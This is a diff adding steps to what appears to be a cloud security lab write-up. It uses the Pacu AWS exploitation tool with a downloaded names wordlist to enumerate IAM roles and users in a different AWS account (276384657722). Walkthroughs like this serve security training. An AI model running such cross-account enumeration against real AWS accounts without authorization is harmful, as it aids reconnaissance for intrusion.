@@ -58,4 +58,27 @@ Next step is to use the tool PACU https://github.com/RhinoSecurityLabs/pacu and 
 Then, run pacu and set the PT Academy credentials with `set_keys`
 ![image](https://user-images.githubusercontent.com/46797181/222338074-b9c84be8-efba-457e-abd2-199a877cd9dc.png)
 
+To list PACU modules run `list`
+![image](https://user-images.githubusercontent.com/46797181/222340458-606f8463-b03d-4fdf-b5fd-2b63a575a694.png)
 
+As mentioned in the description, download the names wordlist `wget https://raw.githubusercontent.com/jeswinMathai/wordlist/main/names.txt`
+Lets append `-ad` with 
+
+```
+#Linux
+sed -i 's/^/ad-/g' names.txt    
+#Mac OS
+sed -i '' 's/^/ad-/g' names.txt
+
+```
+![image](https://user-images.githubusercontent.com/46797181/222341732-12f7feb6-4beb-45b3-9f71-4bedfd70baed.png)
+
+Run the pacu module to enumerate roles `run iam__enum_roles --role-name jllRole  --account-id 276384657722 --word-list names.txt` 
+
+Our profile is from a different account and we are able to enumerate another account which is 276384657722 
+
+![image](https://user-images.githubusercontent.com/46797181/222343186-2f1077cb-c852-4ada-a88f-dd42dde03a6a.png)
+
+For users, execute `run iam__enum_users --role-name jllRole  --account-id 276384657722 --word-list names.txt` 
+
+![image](https://user-images.githubusercontent.com/46797181/222344831-2eb980b3-8ad2-4e86-82e3-a4df0690c9e5.png)
